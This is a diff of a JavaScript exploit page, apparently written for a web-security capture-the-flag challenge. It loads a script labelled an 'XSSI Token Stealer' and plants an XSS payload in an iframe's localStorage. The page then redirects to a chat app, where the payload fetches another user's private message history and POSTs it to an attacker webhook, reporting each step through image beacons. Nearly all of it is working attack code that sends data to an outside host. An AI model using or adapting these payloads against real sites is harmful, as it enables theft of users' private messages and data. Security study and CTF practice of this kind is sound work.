@@ -17,7 +17,6 @@
         new Image().src = W + "/?step=1_github_started";
     </script>
 
-    <!-- The XSSI Token Stealer -->
     <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
 
     <script>
@@ -50,20 +49,21 @@
                     "m.onload=function(){" +
                         "new Image().src='" + W + "/?step=5_match_iframe_ready';" +
                         
-                        // THE CHAT HEIST TRAP
-                        // 1. Force the page to load Glillery's chat history
-                        // 2. Wait 1000ms for the AJAX request to finish loading the messages
-                        // 3. POST the entire Chat page HTML to the webhook
+                        // THE ULTIMATE HEIST: 
+                        // Fetch the raw message history directly and POST it to the webhook
                         "var trap = \"new Image().src='" + W + "/?step=7_chat_xss_fired'; " +
-                                   "load_messages('Glillery Hinton'); " +
-                                   "setTimeout(function(){ " +
+                                   "var r = new XMLHttpRequest(); " +
+                                   "r.onload = function() { " +
                                    "  var x=new XMLHttpRequest(); " +
                                    "  x.open('POST', '" + W + "'); " +
-                                   "  x.send(document.body.innerHTML); " +
-                                   "}, 1000);\";" +
+                                   "  x.send(this.responseText); " +
+                                   "}; " +
+                                   "r.open('GET', '/Glillery Hinton'); " +
+                                   "r.send();\";" +
                                    
                         "var p = '</option></select><img src=x onerror=\"' + trap + '\">';" +
-                        "m.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));" +
+                        
+                        "m.contentWindow.localStorage.setItem('favorites', JSON.stringify(['Glillery Hinton', p]));" +
                         
                         "new Image().src='" + W + "/?step=6_redirecting_to_chat';" +
                         "window.location.href='https://chat.owley-madison.jeopardy.websec.saarland/';" +
